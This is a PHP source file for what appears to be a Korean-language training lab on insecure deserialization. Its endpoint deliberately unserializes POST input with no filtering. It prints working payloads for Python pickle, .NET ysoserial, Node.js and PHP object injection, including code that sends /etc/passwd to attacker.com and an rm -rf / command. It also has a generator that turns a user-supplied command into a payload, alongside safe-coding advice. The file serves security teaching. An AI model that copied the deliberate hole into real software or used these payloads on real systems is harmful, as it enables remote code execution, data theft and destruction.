<?php
// 출력 버퍼링 시작 (헤더 전송 문제 방지)
ob_start();

// 세션 시작 (헤더 전송 전)
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

require_once __DIR__ . '/../db.php';
require_once __DIR__ . '/../utils.php';

class AdvancedDeserializationTest {
    private $db;
    
    public function __construct($db) {
        $this->db = $db;
        $this->initializeDatabase();
    }
    
    private function initializeDatabase() {
        // 직렬화 테스트용 테이블 생성
        $tables = [
            "CREATE TABLE IF NOT EXISTS des_sessions (
                id INT AUTO_INCREMENT PRIMARY KEY,
                session_id VARCHAR(100) NOT NULL,
                user_data TEXT,
                serialization_type ENUM('php', 'json', 'pickle', 'marshal') DEFAULT 'php',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )",
            "CREATE TABLE IF NOT EXISTS des_objects (
                id INT AUTO_INCREMENT PRIMARY KEY,
                object_name VARCHAR(100) NOT NULL,
                object_data LONGTEXT,
                object_type VARCHAR(50),
                is_safe BOOLEAN DEFAULT FALSE,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )"
        ];
        
        foreach ($tables as $sql) {
            $this->db->exec($sql);
        }
    }
    
    public function vulnerablePHPUnserialize($serialized_data) {
        $result = '';
        
        try {
            $result .= "<div class='vulnerable-output'>";
            $result .= "<h4>🔓 취약한 PHP unserialize() 실행</h4>";
            $result .= "<p><strong>입력 데이터:</strong> " . htmlspecialchars($serialized_data) . "</p>";
            
            // 🚨 CRITICAL VULNERABILITY: 필터링 없이 unserialize 실행
            $result .= "<p><strong>⚠️ 위험:</strong> 필터링 없이 unserialize() 실행...</p>";
            
            // 임시 출력 버퍼링으로 에러나 출력 캐치
            ob_start();
            set_error_handler(function($severity, $message) use (&$result) {
                $result .= "<p class='alert-danger'><strong>🚨 실행 오류:</strong> " . htmlspecialchars($message) . "</p>";
            });
            
            try {
                $unserialized = unserialize($serialized_data);
                $output = ob_get_contents();
                
                if ($unserialized !== false) {
                    $result .= "<p><strong>✅ Unserialize 성공!</strong></p>";
                    $result .= "<p><strong>타입:</strong> " . gettype($unserialized) . "</p>";
                    
                    if (is_object($unserialized)) {
                        $result .= "<p><strong>클래스:</strong> " . get_class($unserialized) . "</p>";
                        
                        // 객체의 속성 출력 (위험한 속성이 있을 수 있음)
                        $properties = get_object_vars($unserialized);
                        if (!empty($properties)) {
                            $result .= "<p><strong>속성들:</strong></p><ul>";
                            foreach ($properties as $key => $value) {
                                $result .= "<li><strong>$key:</strong> " . htmlspecialchars(print_r($value, true)) . "</li>";
                            }
                            $result .= "</ul>";
                        }
                        
                        // Magic 메서드 호출 시뮬레이션
                        if (method_exists($unserialized, '__wakeup')) {
                            $result .= "<p class='alert-danger'><strong>🚨 __wakeup() 메서드 실행됨!</strong></p>";
                        }
                        
                        if (method_exists($unserialized, '__destruct')) {
                            $result .= "<p class='alert-danger'><strong>🚨 __destruct() 메서드가 곧 실행될 예정!</strong></p>";
                        }
                        
                    } else {
                        $result .= "<p><strong>값:</strong> " . htmlspecialchars(print_r($unserialized, true)) . "</p>";
                    }
                    
                } else {
                    $result .= "<p class='alert-warning'><strong>❌ Unserialize 실패</strong></p>";
                }
                
                if (!empty($output)) {
                    $result .= "<p><strong>출력:</strong> " . htmlspecialchars($output) . "</p>";
                }
                
            } catch (Exception $e) {
                $result .= "<p class='alert-danger'><strong>🚨 예외 발생:</strong> " . htmlspecialchars($e->getMessage()) . "</p>";
            } finally {
                restore_error_handler();
                ob_end_clean();
            }
            
            $result .= "<p class='alert-danger'><strong>⚠️ 보안 경고:</strong> 신뢰할 수 없는 데이터로 unserialize()를 사용하면 원격 코드 실행이 가능합니다!</p>";
            $result .= "</div>";
            
        } catch (Exception $e) {
            $result .= "<div class='error-output'>❌ 오류: " . htmlspecialchars($e->getMessage()) . "</div>";
        }
        
        return $result;
    }
    
    public function safePHPSerialization($data) {
        $result = '';
        
        try {
            $result .= "<div class='safe-output'>";
            $result .= "<h4>🔒 안전한 PHP 직렬화 구현</h4>";
            
            // JSON 사용 (타입 안전)
            $json_data = json_encode($data);
            $result .= "<p><strong>1. JSON 직렬화:</strong> " . htmlspecialchars($json_data) . "</p>";
            
            $json_decoded = json_decode($json_data, true);
            $result .= "<p><strong>✅ JSON 복원 성공:</strong> " . htmlspecialchars(print_r($json_decoded, true)) . "</p>";
            
            // 화이트리스트 기반 unserialize (PHP 7+)
            if (version_compare(PHP_VERSION, '7.0.0') >= 0) {
                $test_object = new stdClass();
                $test_object->name = "Test";
                $test_object->value = 123;
                
                $serialized = serialize($test_object);
                $result .= "<p><strong>2. 화이트리스트 기반 unserialize:</strong></p>";
                $result .= "<p><strong>원본:</strong> " . htmlspecialchars($serialized) . "</p>";
                
                $allowed_classes = ['stdClass']; // 허용된 클래스만
                $safe_unserialized = unserialize($serialized, ['allowed_classes' => $allowed_classes]);
                
                if ($safe_unserialized !== false) {
                    $result .= "<p><strong>✅ 안전한 복원 성공:</strong> " . htmlspecialchars(print_r($safe_unserialized, true)) . "</p>";
                }
            }
            
            $result .= "<p class='alert-success'><strong>🔒 안전함:</strong> JSON이나 화이트리스트 기반 직렬화는 코드 실행 위험이 없습니다.</p>";
            $result .= "</div>";
            
        } catch (Exception $e) {
            $result .= "<div class='error-output'>❌ 오류: " . htmlspecialchars($e->getMessage()) . "</div>";
        }
        
        return $result;
    }
    
    public function simulatePythonPickle($pickle_simulation) {
        $result = '';
        
        try {
            $result .= "<div class='vulnerable-output'>";
            $result .= "<h4>🐍 Python Pickle 취약점 시뮬레이션</h4>";
            
            // Python pickle 공격 시나리오 설명
            $malicious_scenarios = [
                'os_command' => [
                    'name' => '시스템 명령 실행',
                    'description' => 'os.system()을 통한 명령 실행',
                    'payload' => "cos\nsystem\n(S'whoami'\ntR.",
                    'risk' => '원격 코드 실행 - 매우 위험'
                ],
                'file_read' => [
                    'name' => '파일 읽기',
                    'description' => 'open()과 read()를 통한 민감 파일 접근',
                    'payload' => "cbuiltins\nopen\n(S'/etc/passwd'\nS'r'\ntR(S'read'\ntR.",
                    'risk' => '정보 유출 - 위험'
                ],
                'network_request' => [
                    'name' => '네트워크 요청',
                    'description' => 'urllib를 통한 외부 서버 접근',
                    'payload' => "curllib.request\nurlopen\n(S'http://attacker.com/steal'\ntR.",
                    'risk' => '데이터 유출 - 위험'
                ],
                'memory_corruption' => [
                    'name' => '메모리 조작',
                    'description' => 'ctypes를 통한 메모리 조작',
                    'payload' => "cctypes\ncdll\n(S'libc.so.6'\ntRattr\nS'system'\ntR(S'rm -rf /'\ntR.",
                    'risk' => '시스템 파괴 - 극도로 위험'
                ]
            ];
            
            if (isset($malicious_scenarios[$pickle_simulation])) {
                $scenario = $malicious_scenarios[$pickle_simulation];
                
                $result .= "<p><strong>공격 시나리오:</strong> {$scenario['name']}</p>";
                $result .= "<p><strong>설명:</strong> {$scenario['description']}</p>";
                $result .= "<p><strong>Pickle 페이로드:</strong></p>";
                $result .= "<pre style='background-color: #f8f8f8; padding: 10px; border-radius: 5px;'>";
                $result .= htmlspecialchars($scenario['payload']);
                $result .= "</pre>";
                $result .= "<p class='alert-danger'><strong>🚨 위험도:</strong> {$scenario['risk']}</p>";
                
                // Python 코드 예제
                $result .= "<p><strong>Python 공격 코드 예제:</strong></p>";
                $result .= "<pre style='background-color: #2d3748; color: #e2e8f0; padding: 15px; border-radius: 5px;'>";
                
                switch ($pickle_simulation) {
                    case 'os_command':
                        $result .= "import pickle\nimport os\n\nclass RCE:\n    def __reduce__(self):\n        return (os.system, ('whoami',))\n\nmalicious = pickle.dumps(RCE())\n# 이 데이터를 서버로 전송하면 whoami 명령이 실행됨";
                        break;
                    case 'file_read':
                        $result .= "import pickle\n\nclass FileRead:\n    def __reduce__(self):\n        return (open, ('/etc/passwd', 'r'))\n\n# 또는 더 정교한 방법\nclass AdvancedFileRead:\n    def __reduce__(self):\n        return (__import__('os').popen, ('cat /etc/passwd',))";
                        break;
                    case 'network_request':
                        $result .= "import pickle\nimport urllib.request\n\nclass Exfiltrate:\n    def __reduce__(self):\n        return (urllib.request.urlopen, \n                ('http://attacker.com/steal?data=' + \n                 open('/etc/passwd').read(),))";
                        break;
                    case 'memory_corruption':
                        $result .= "import pickle\nimport ctypes\n\nclass MemoryAttack:\n    def __reduce__(self):\n        return (ctypes.cdll.LoadLibrary('libc.so.6').system, \n                (b'echo \"System compromised\"',))";
                        break;
                }
                
                $result .= "</pre>";
                
                // 실제 영향 시뮬레이션
                $result .= "<p><strong>🔥 실제 공격이었다면:</strong></p>";
                $result .= "<ul>";
                
                switch ($pickle_simulation) {
                    case 'os_command':
                        $result .= "<li>현재 사용자 정보가 노출됨</li>";
                        $result .= "<li>임의의 시스템 명령 실행 가능</li>";
                        $result .= "<li>서버 완전 장악 가능</li>";
                        break;
                    case 'file_read':
                        $result .= "<li>/etc/passwd 파일 내용이 노출됨</li>";
                        $result .= "<li>시스템 사용자 목록 획득</li>";
                        $result .= "<li>추가 공격의 발판 마련</li>";
                        break;
                    case 'network_request':
                        $result .= "<li>민감 파일이 외부 서버로 전송됨</li>";
                        $result .= "<li>데이터 유출 발생</li>";
                        $result .= "<li>네트워크 스캔 및 정찰 가능</li>";
                        break;
                    case 'memory_corruption':
                        $result .= "<li>메모리 직접 조작으로 시스템 불안정</li>";
                        $result .= "<li>프로세스 하이재킹 가능</li>";
                        $result .= "<li>커널 수준 권한 획득 가능</li>";
                        break;
                }
                
                $result .= "</ul>";
                
            } else {
                $result .= "<p>알 수 없는 시나리오입니다.</p>";
            }
            
            $result .= "</div>";
            
        } catch (Exception $e) {
            $result .= "<div class='error-output'>❌ 오류: " . htmlspecialchars($e->getMessage()) . "</div>";
        }
        
        return $result;
    }
    
    public function simulateDotNetBinaryFormatter($attack_type) {
        $result = '';
        
        try {
            $result .= "<div class='vulnerable-output'>";
            $result .= "<h4>⚡ .NET BinaryFormatter 취약점 시뮬레이션</h4>";
            
            $dotnet_attacks = [
                'type_confusion' => [
                    'name' => 'Type Confusion 공격',
                    'description' => 'ysoserial.net을 사용한 타입 혼동 공격',
                    'gadget' => 'TypeConfuseDelegate',
                    'impact' => '임의 코드 실행'
                ],
                'xml_serializer' => [
                    'name' => 'XmlSerializer 우회',
                    'description' => 'XML 직렬화를 통한 코드 실행',
                    'gadget' => 'XmlSerializer',
                    'impact' => '파일 시스템 접근'
                ],
                'data_contract' => [
                    'name' => 'DataContractSerializer 공격',
                    'description' => 'WCF DataContract를 통한 공격',
                    'gadget' => 'DataContractSerializer',
                    'impact' => '네트워크 접근'
                ],
                'soap_formatter' => [
                    'name' => 'SoapFormatter 취약점',
                    'description' => 'SOAP 포맷터를 통한 RCE',
                    'gadget' => 'SoapFormatter',
                    'impact' => '시스템 명령 실행'
                ]
            ];
            
            if (isset($dotnet_attacks[$attack_type])) {
                $attack = $dotnet_attacks[$attack_type];
                
                $result .= "<p><strong>공격 유형:</strong> {$attack['name']}</p>";
                $result .= "<p><strong>설명:</strong> {$attack['description']}</p>";
                $result .= "<p><strong>사용 Gadget:</strong> {$attack['gadget']}</p>";
                $result .= "<p class='alert-danger'><strong>🚨 잠재적 영향:</strong> {$attack['impact']}</p>";
                
                // ysoserial.net 명령어 예제
                $result .= "<p><strong>ysoserial.net 명령어:</strong></p>";
                $result .= "<pre style='background-color: #1a202c; color: #e2e8f0; padding: 15px; border-radius: 5px;'>";
                
                switch ($attack_type) {
                    case 'type_confusion':
                        $result .= "ysoserial.exe -g TypeConfuseDelegate \\\n";
                        $result .= "  -f BinaryFormatter \\\n";
                        $result .= "  -c \"calc.exe\" \\\n";
                        $result .= "  -o base64";
                        break;
                    case 'xml_serializer':
                        $result .= "ysoserial.exe -g XmlSerializer \\\n";
                        $result .= "  -f XmlSerializer \\\n";
                        $result .= "  -c \"powershell.exe -c Get-Process\" \\\n";
                        $result .= "  -o raw";
                        break;
                    case 'data_contract':
                        $result .= "ysoserial.exe -g DataContractSerializer \\\n";
                        $result .= "  -f DataContractSerializer \\\n";
                        $result .= "  -c \"cmd.exe /c whoami\" \\\n";
                        $result .= "  -o hex";
                        break;
                    case 'soap_formatter':
                        $result .= "ysoserial.exe -g SoapFormatter \\\n";
                        $result .= "  -f SoapFormatter \\\n";
                        $result .= "  -c \"notepad.exe\" \\\n";
                        $result .= "  -o base64";
                        break;
                }
                
                $result .= "</pre>";
                
                // C# 취약한 코드 예제
                $result .= "<p><strong>취약한 C# 코드:</strong></p>";
                $result .= "<pre style='background-color: #2d3748; color: #e2e8f0; padding: 15px; border-radius: 5px;'>";
                $result .= "// 취약한 구현\n";
                $result .= "BinaryFormatter formatter = new BinaryFormatter();\n";
                $result .= "byte[] data = Convert.FromBase64String(userInput);\n";
                $result .= "MemoryStream stream = new MemoryStream(data);\n\n";
                $result .= "// 🚨 위험: 신뢰할 수 없는 데이터 역직렬화\n";
                $result .= "object obj = formatter.Deserialize(stream);\n\n";
                $result .= "// 이 시점에서 악의적인 코드가 실행될 수 있음";
                $result .= "</pre>";
                
                // 공격 체인 설명
                $result .= "<p><strong>🔗 공격 체인:</strong></p>";
                $result .= "<ol>";
                $result .= "<li>공격자가 ysoserial.net으로 악의적인 페이로드 생성</li>";
                $result .= "<li>페이로드를 Base64 등으로 인코딩하여 전송</li>";
                $result .= "<li>서버가 BinaryFormatter.Deserialize() 호출</li>";
                $result .= "<li>Gadget 체인이 실행되어 임의 코드 실행</li>";
                $result .= "<li>공격자가 서버 제어권 획득</li>";
                $result .= "</ol>";
                
                $result .= "<p class='alert-danger'><strong>⚠️ 실제 위험:</strong> .NET BinaryFormatter는 Microsoft에서 사용 중단을 권고하는 극도로 위험한 직렬화 방식입니다.</p>";
                
            }
            
            $result .= "</div>";
            
        } catch (Exception $e) {
            $result .= "<div class='error-output'>❌ 오류: " . htmlspecialchars($e->getMessage()) . "</div>";
        }
        
        return $result;
    }
    
    public function simulateNodeJsDeserialization($payload_type) {
        $result = '';
        
        try {
            $result .= "<div class='vulnerable-output'>";
            $result .= "<h4>🟢 Node.js 직렬화 취약점 시뮬레이션</h4>";
            
            $nodejs_attacks = [
                'node_serialize' => [
                    'name' => 'node-serialize 취약점',
                    'description' => 'IIFE (즉시 실행 함수)를 통한 코드 실행',
                    'module' => 'node-serialize',
                    'vector' => 'Function constructor abuse'
                ],
                'serialize_javascript' => [
                    'name' => 'serialize-javascript XSS',
                    'description' => '클라이언트 사이드 코드 주입',
                    'module' => 'serialize-javascript',
                    'vector' => 'Script injection'
                ],
                'funcster' => [
                    'name' => 'funcster RCE',
                    'description' => '함수 직렬화를 통한 원격 코드 실행',
                    'module' => 'funcster',
                    'vector' => 'Function deserialization'
                ],
                'cryo' => [
                    'name' => 'cryo 프로토타입 오염',
                    'description' => '프로토타입 체인 조작을 통한 공격',
                    'module' => 'cryo',
                    'vector' => 'Prototype pollution'
                ]
            ];
            
            if (isset($nodejs_attacks[$payload_type])) {
                $attack = $nodejs_attacks[$payload_type];
                
                $result .= "<p><strong>공격 대상:</strong> {$attack['name']}</p>";
                $result .= "<p><strong>설명:</strong> {$attack['description']}</p>";
                $result .= "<p><strong>모듈:</strong> {$attack['module']}</p>";
                $result .= "<p><strong>공격 벡터:</strong> {$attack['vector']}</p>";
                
                // 공격 코드 예제
                $result .= "<p><strong>🚨 악의적인 페이로드:</strong></p>";
                $result .= "<pre style='background-color: #0d1117; color: #c9d1d9; padding: 15px; border-radius: 5px;'>";
                
                switch ($payload_type) {
                    case 'node_serialize':
                        $result .= "// node-serialize 공격\n";
                        $result .= "const serialize = require('node-serialize');\n\n";
                        $result .= "// 악의적인 페이로드\n";
                        $result .= "const malicious = {\n";
                        $result .= "  'rce': {\n";
                        $result .= "    '__proto__': {\n";
                        $result .= "      'type': 'constructor',\n";
                        $result .= "      'func': 'function(){ require(\"child_process\").exec(\"calc.exe\"); }()'\n";
                        $result .= "    }\n";
                        $result .= "  }\n";
                        $result .= "};\n\n";
                        $result .= "// 직렬화\n";
                        $result .= "const payload = serialize.serialize(malicious);\n";
                        $result .= "console.log('Payload:', payload);\n\n";
                        $result .= "// 🚨 역직렬화 시 코드 실행됨\n";
                        $result .= "serialize.unserialize(payload);";
                        break;
                        
                    case 'serialize_javascript':
                        $result .= "// serialize-javascript XSS\n";
                        $result .= "const serialize = require('serialize-javascript');\n\n";
                        $result .= "// XSS 페이로드\n";
                        $result .= "const xssPayload = {\n";
                        $result .= "  name: '</script><script>alert(\"XSS\")</script>',\n";
                        $result .= "  data: 'normal data'\n";
                        $result .= "};\n\n";
                        $result .= "// 직렬화 (클라이언트로 전송)\n";
                        $result .= "const serialized = serialize(xssPayload);\n";
                        $result .= 'res.send(`<script>var data = ${serialized};</script>`);\n\n';
                        $result .= "// 🚨 브라우저에서 스크립트 실행됨";
                        break;
                        
                    case 'funcster':
                        $result .= "// funcster RCE\n";
                        $result .= "const funcster = require('funcster');\n\n";
                        $result .= "// 악의적인 함수\n";
                        $result .= "const maliciousFunc = function() {\n";
                        $result .= "  const { exec } = require('child_process');\n";
                        $result .= "  exec('rm -rf /', (err, stdout) => {\n";
                        $result .= "    console.log('System compromised');\n";
                        $result .= "  });\n";
                        $result .= "};\n\n";
                        $result .= "// 함수 직렬화\n";
                        $result .= "const serialized = funcster.serialize(maliciousFunc);\n";
                        $result .= "console.log('Serialized function:', serialized);\n\n";
                        $result .= "// 🚨 역직렬화 및 실행\n";
                        $result .= "const restored = funcster.deserialize(serialized);\n";
                        $result .= "restored(); // 악의적인 코드 실행";
                        break;
                        
                    case 'cryo':
                        $result .= "// cryo 프로토타입 오염\n";
                        $result .= "const Cryo = require('cryo');\n\n";
                        $result .= "// 프로토타입 오염 페이로드\n";
                        $result .= "const pollutionPayload = {\n";
                        $result .= "  '__proto__': {\n";
                        $result .= "    'polluted': 'yes',\n";
                        $result .= "    'isAdmin': true,\n";
                        $result .= "    'exec': function() { \n";
                        $result .= "      require('child_process').exec('whoami'); \n";
                        $result .= "    }\n";
                        $result .= "  },\n";
                        $result .= "  'normalData': 'hello'\n";
                        $result .= "};\n\n";
                        $result .= "// 직렬화\n";
                        $result .= "const frozen = Cryo.stringify(pollutionPayload);\n";
                        $result .= "console.log('Frozen:', frozen);\n\n";
                        $result .= "// 🚨 역직렬화로 프로토타입 오염\n";
                        $result .= "const thawed = Cryo.parse(frozen);\n";
                        $result .= "console.log({}.polluted); // 'yes' - 오염 성공";
                        break;
                }
                
                $result .= "</pre>";
                
                // 방어 방법
                $result .= "<p><strong>🛡️ 방어 방법:</strong></p>";
                $result .= "<ul>";
                
                switch ($payload_type) {
                    case 'node_serialize':
                        $result .= "<li>node-serialize 사용 중단</li>";
                        $result .= "<li>JSON.parse() 사용</li>";
                        $result .= "<li>입력 데이터 검증 강화</li>";
                        break;
                    case 'serialize_javascript':
                        $result .= "<li>isJSON 옵션 사용</li>";
                        $result .= "<li>출력 시 HTML 이스케이핑</li>";
                        $result .= "<li>CSP (Content Security Policy) 적용</li>";
                        break;
                    case 'funcster':
                        $result .= "<li>함수 직렬화 금지</li>";
                        $result .= "<li>대안적인 데이터 전송 방식 사용</li>";
                        $result .= "<li>코드와 데이터 분리</li>";
                        break;
                    case 'cryo':
                        $result .= "<li>Object.freeze() 사용</li>";
                        $result .= "<li>프로토타입 오염 탐지</li>";
                        $result .= "<li>Map/Set 사용으로 프로토타입 체인 회피</li>";
                        break;
                }
                
                $result .= "</ul>";
                
                // 실제 영향도
                $result .= "<p><strong>🔥 실제 공격 시 영향:</strong></p>";
                $result .= "<div class='alert-danger' style='margin: 10px 0; padding: 10px;'>";
                switch ($payload_type) {
                    case 'node_serialize':
                        $result .= "서버에서 임의 코드 실행 → 완전한 서버 제어권 획득";
                        break;
                    case 'serialize_javascript':
                        $result .= "클라이언트 브라우저에서 XSS → 사용자 세션 하이재킹";
                        break;
                    case 'funcster':
                        $result .= "함수 코드 실행 → 파일 시스템 접근 및 데이터 유출";
                        break;
                    case 'cryo':
                        $result .= "프로토타입 오염 → 애플리케이션 로직 우회 및 권한 상승";
                        break;
                }
                $result .= "</div>";
            }
            
            $result .= "</div>";
            
        } catch (Exception $e) {
            $result .= "<div class='error-output'>❌ 오류: " . htmlspecialchars($e->getMessage()) . "</div>";
        }
        
        return $result;
    }
    
    public function generateMaliciousPayload($type, $command = '') {
        $result = '';
        
        try {
            $result .= "<div class='vulnerable-output'>";
            $result .= "<h4>⚠️ 악의적인 페이로드 생성기</h4>";
            $result .= "<p class='alert-danger'><strong>경고:</strong> 이 페이로드들은 교육 목적으로만 사용하세요!</p>";
            
            switch ($type) {
                case 'php_object_injection':
                    $result .= "<h5>🔓 PHP Object Injection 페이로드:</h5>";
                    
                    // Magic Method 악용 클래스 생성
                    $php_payload = 'O:10:"EvilObject":2:{s:7:"command";s:' . strlen($command) . ':"' . $command . '";s:6:"target";s:10:"/etc/passwd";}';
                    
                    $result .= "<p><strong>명령어:</strong> " . htmlspecialchars($command) . "</p>";
                    $result .= "<p><strong>생성된 페이로드:</strong></p>";
                    $result .= "<textarea readonly style='width: 100%; height: 100px; font-family: monospace;'>";
                    $result .= htmlspecialchars($php_payload);
                    $result .= "</textarea>";
                    
                    // 취약한 클래스 예제
                    $result .= "<p><strong>취약한 클래스 예제:</strong></p>";
                    $result .= "<pre style='background-color: #2d3748; color: #e2e8f0; padding: 15px;'>";
                    $result .= "class EvilObject {\n";
                    $result .= "    public \$command;\n";
                    $result .= "    public \$target;\n\n";
                    $result .= "    public function __wakeup() {\n";
                    $result .= "        // 🚨 역직렬화 시 자동 실행\n";
                    $result .= "        exec(\$this->command);\n";
                    $result .= "    }\n\n";
                    $result .= "    public function __destruct() {\n";
                    $result .= "        // 🚨 객체 소멸 시 실행\n";
                    $result .= "        file_get_contents(\$this->target);\n";
                    $result .= "    }\n";
                    $result .= "}";
                    $result .= "</pre>";
                    break;
                    
                case 'java_ysoserial':
                    $result .= "<h5>☕ Java ysoserial 페이로드:</h5>";
                    $gadgets = [
                        'CommonsBeanutils1' => 'Apache Commons BeanUtils',
                        'CommonsCollections1' => 'Apache Commons Collections 3.1-3.2.1',
                        'CommonsCollections6' => 'Apache Commons Collections 3.1',
                        'Groovy1' => 'Groovy 1.7-2.4',
                        'Spring1' => 'Spring Core 4.1.4-5.0.1'
                    ];
                    
                    $result .= "<p><strong>명령어:</strong> " . htmlspecialchars($command) . "</p>";
                    $result .= "<p><strong>사용 가능한 Gadget 체인:</strong></p>";
                    
                    foreach ($gadgets as $gadget => $version) {
                        $result .= "<div style='margin: 10px 0; padding: 10px; background-color: #f8f9fa; border-left: 4px solid #dc3545;'>";
                        $result .= "<strong>$gadget</strong> ($version)<br>";
                        $result .= "<code>ysoserial.jar $gadget \"$command\"</code>";
                        $result .= "</div>";
                    }
                    break;
                    
                case 'python_pickle_rce':
                    $result .= "<h5>🐍 Python Pickle RCE 페이로드:</h5>";
                    
                    $result .= "<p><strong>명령어:</strong> " . htmlspecialchars($command) . "</p>";
                    $result .= "<p><strong>Python 코드:</strong></p>";
                    $result .= "<pre style='background-color: #2d3748; color: #e2e8f0; padding: 15px;'>";
                    $result .= "import pickle\nimport os\nimport base64\n\n";
                    $result .= "class RCE:\n";
                    $result .= "    def __reduce__(self):\n";
                    $result .= "        return (os.system, ('" . addslashes($command) . "',))\n\n";
                    $result .= "# 페이로드 생성\n";
                    $result .= "malicious = pickle.dumps(RCE())\n";
                    $result .= "payload = base64.b64encode(malicious).decode()\n";
                    $result .= "print('Base64 Payload:', payload)";
                    $result .= "</pre>";
                    
                    // 실제 페이로드 생성 시뮬레이션
                    $simulated_payload = base64_encode('pickle_simulation_' . $command);
                    $result .= "<p><strong>시뮬레이션 페이로드:</strong></p>";
                    $result .= "<textarea readonly style='width: 100%; height: 80px; font-family: monospace;'>";
                    $result .= $simulated_payload;
                    $result .= "</textarea>";
                    break;
            }
            
            $result .= "<p class='alert-warning'><strong>⚠️ 사용 시 주의사항:</strong></p>";
            $result .= "<ul>";
            $result .= "<li>이 페이로드들은 실제로 시스템에 피해를 줄 수 있습니다</li>";
            $result .= "<li>오직 격리된 테스트 환경에서만 사용하세요</li>";
            $result .= "<li>실제 서비스에서는 절대 실행하지 마세요</li>";
            $result .= "<li>법적 책임은 사용자에게 있습니다</li>";
            $result .= "</ul>";
            
            $result .= "</div>";
            
        } catch (Exception $e) {
            $result .= "<div class='error-output'>❌ 오류: " . htmlspecialchars($e->getMessage()) . "</div>";
        }
        
        return $result;
    }
    
    public function showSecurityRecommendations() {
        return "
        <div class='safe-output'>
            <h4>🛡️ 직렬화 보안 권장사항</h4>
            
            <h5>1. 언어별 안전한 직렬화 방법:</h5>
            
            <h6>PHP:</h6>
            <pre><code>// ❌ 위험한 방법
\$data = unserialize(\$_POST['data']);

// ✅ 안전한 방법들
\$data = json_decode(\$_POST['data'], true); // JSON 사용
\$data = unserialize(\$_POST['data'], ['allowed_classes' => ['SafeClass']]); // 화이트리스트
\$data = igbinary_unserialize(\$_POST['data']); // igbinary 사용</code></pre>
            
            <h6>Python:</h6>
            <pre><code># ❌ 위험한 방법
import pickle
data = pickle.loads(user_input)

# ✅ 안전한 방법들
import json
data = json.loads(user_input)  # JSON 사용

import dill
data = dill.loads(user_input, safe=True)  # 안전 모드

# 또는 커스텀 직렬화
import msgpack
data = msgpack.unpackb(user_input, raw=False)</code></pre>
            
            <h6>.NET:</h6>
            <pre><code>// ❌ 위험한 방법
BinaryFormatter formatter = new BinaryFormatter();
object obj = formatter.Deserialize(stream);

// ✅ 안전한 방법들
// JSON 사용
string json = JsonConvert.SerializeObject(obj);
MyClass obj = JsonConvert.DeserializeObject<MyClass>(json);

// DataContract 사용
DataContractJsonSerializer serializer = new DataContractJsonSerializer(typeof(MyClass));
MyClass obj = (MyClass)serializer.ReadObject(stream);</code></pre>
            
            <h6>Node.js:</h6>
            <pre><code>// ❌ 위험한 방법
const serialize = require('node-serialize');
const data = serialize.unserialize(userInput);

// ✅ 안전한 방법들
const data = JSON.parse(userInput);  // 단순 JSON
const data = EJSON.parse(userInput); // MongoDB EJSON
const data = msgpack.decode(userInput); // MessagePack</code></pre>
            
            <h5>2. 일반적인 보안 원칙:</h5>
            <ul>
                <li><strong>신뢰할 수 없는 데이터 역직렬화 금지</strong></li>
                <li><strong>입력 검증 및 화이트리스트 사용</strong></li>
                <li><strong>최소 권한 원칙 적용</strong></li>
                <li><strong>네트워크 분리 및 샌드박싱</strong></li>
                <li><strong>정기적인 보안 패치 적용</strong></li>
            </ul>
            
            <h5>3. 탐지 및 모니터링:</h5>
            <ul>
                <li><strong>비정상적인 직렬화 데이터 패턴 탐지</strong></li>
                <li><strong>시스템 호출 모니터링</strong></li>
                <li><strong>네트워크 트래픽 분석</strong></li>
                <li><strong>애플리케이션 로그 분석</strong></li>
            </ul>
            
            <h5>4. 응급 대응:</h5>
            <ul>
                <li><strong>즉시 서비스 격리</strong></li>
                <li><strong>영향 범위 분석</strong></li>
                <li><strong>포렌식 증거 수집</strong></li>
                <li><strong>패치 및 복구 계획 수립</strong></li>
            </ul>
            
            <p class='alert-success'><strong>✅ 핵심 메시지:</strong> 직렬화는 편리하지만 극도로 위험할 수 있습니다. 가능하면 JSON 같은 데이터 전용 포맷을 사용하고, 불가피하게 객체 직렬화를 사용할 때는 반드시 적절한 보안 조치를 적용하세요.</p>
        </div>";
    }
}

// 로그인 확인
if (!is_logged_in()) {
    header('Location: ../login.php');
    exit();
}

// 메인 처리
global $pdo;
if (!isset($pdo) || !$pdo) {
    die("데이터베이스 연결에 실패했습니다. 설정을 확인해주세요.");
}

$deserializationTest = new AdvancedDeserializationTest($pdo);
$result = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    
    switch ($action) {
        case 'php_unserialize':
            $data = $_POST['serialized_data'] ?? '';
            $result = $deserializationTest->vulnerablePHPUnserialize($data);
            break;
            
        case 'php_safe':
            $data = ['name' => 'test', 'value' => 123, 'array' => [1,2,3]];
            $result = $deserializationTest->safePHPSerialization($data);
            break;
            
        case 'python_pickle':
            $simulation = $_POST['pickle_type'] ?? 'os_command';
            $result = $deserializationTest->simulatePythonPickle($simulation);
            break;
            
        case 'dotnet_binary':
            $attack_type = $_POST['dotnet_type'] ?? 'type_confusion';
            $result = $deserializationTest->simulateDotNetBinaryFormatter($attack_type);
            break;
            
        case 'nodejs_deserialize':
            $payload_type = $_POST['nodejs_type'] ?? 'node_serialize';
            $result = $deserializationTest->simulateNodeJsDeserialization($payload_type);
            break;
            
        case 'generate_payload':
            $type = $_POST['payload_type'] ?? 'php_object_injection';
            $command = $_POST['command'] ?? 'whoami';
            $result = $deserializationTest->generateMaliciousPayload($type, $command);
            break;
    }
}
?>

<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Deserialization 취약점 테스트</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
            line-height: 1.6;
        }
        
        .container {
            background-color: white;
            border-radius: 10px;
            padding: 30px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        
        h1 {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
            font-size: 2.5em;
        }
        
        .description {
            background-color: #e8f4fd;
            padding: 20px;
            border-left: 5px solid #2196F3;
            margin-bottom: 30px;
            border-radius: 5px;
        }
        
        .test-section {
            margin-bottom: 40px;
            padding: 25px;
            border: 2px solid #ddd;
            border-radius: 10px;
            background-color: #fafafa;
        }
        
        .test-section h3 {
            color: #333;
            border-bottom: 2px solid #eee;
            padding-bottom: 10px;
            margin-bottom: 20px;
        }
        
